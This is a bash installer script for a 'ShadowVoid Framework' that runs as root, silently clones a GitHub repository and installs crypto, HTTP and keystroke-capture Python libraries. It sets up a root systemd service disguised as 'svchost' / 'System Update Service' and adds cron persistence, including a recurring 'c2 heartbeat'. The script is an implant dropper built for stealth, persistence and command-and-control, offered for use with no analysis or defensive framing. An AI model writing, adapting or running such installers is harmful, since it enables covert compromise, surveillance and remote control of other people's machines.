#!/bin/bash
# ShadowVoid Framework Installer v1.0.0-alpha
# Silent installation script
# Zero footprint, self-cleaning

set -e

REPO_URL="https://github.com/mraaisa-afk/shadow-void"
INSTALL_DIR="/opt/shadowvoid"
BIN_DIR="/usr/local/bin"
TEMP_DIR=$(mktemp -d)
SERVICE_NAME="svchost"

RED="\\033[0;31m"
GREEN="\\033[0;32m"
YELLOW="\\033[1;33m"
NC="\\033[0m"

cleanup() {
    rm -rf "$TEMP_DIR"
    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

trap cleanup EXIT

if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] This script must be run as root${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Checking dependencies...${NC}"
for dep in git python3 python3-pip curl wget; do
    if ! command -v "$dep" &> /dev/null; then
        echo -e "${RED}[!] Missing dependency: $dep${NC}"
        apt-get update -qq 2>/dev/null
        apt-get install -y -qq "$dep" 2>/dev/null
    fi
done

echo -e "${YELLOW}[*] Creating installation directory...${NC}"
mkdir -p "$INSTALL_DIR"

echo -e "${YELLOW}[*] Cloning repository...${NC}"
cd "$TEMP_DIR"
git clone --depth 1 "$REPO_URL" shadowvoid-repo > /dev/null 2>&1

echo -e "${YELLOW}[*] Copying files...${NC}"
cp -r shadowvoid-repo/* "$INSTALL_DIR/"
chmod -R 700 "$INSTALL_DIR"

echo -e "${YELLOW}[*] Installing Python dependencies...${NC}"
cd "$INSTALL_DIR"
pip3 install pycryptodome requests pynput -q 2>/dev/null

echo -e "${YELLOW}[*] Creating symlinks...${NC}"
ln -sf "$INSTALL_DIR/loader.py" "$BIN_DIR/sv-loader"
ln -sf "$INSTALL_DIR/core.py" "$BIN_DIR/sv"

echo -e "${YELLOW}[*] Creating systemd service...${NC}"
cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=$BIN_DIR/sv init
Restart=always
RestartSec=30
User=root
WorkingDirectory=$INSTALL_DIR

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload > /dev/null 2>&1
systemctl enable $SERVICE_NAME.service > /dev/null 2>&1
systemctl start $SERVICE_NAME.service > /dev/null 2>&1

echo -e "${YELLOW}[*] Creating persistence...${NC}"
(crontab -l 2>/dev/null; echo "@reboot $BIN_DIR/sv init") | crontab -
(crontab -l 2>/dev/null; echo "*/30 * * * * $BIN_DIR/sv c2 heartbeat") | crontab -

echo -e "${GREEN}[+] Installation complete!${NC}"
echo -e "${GREEN}[+] ShadowVoid Framework is ready${NC}"
echo -e "${GREEN}[+] Run: sv help${NC}"
echo -e "${GREEN}[+] Service: $SERVICE_NAME${NC}"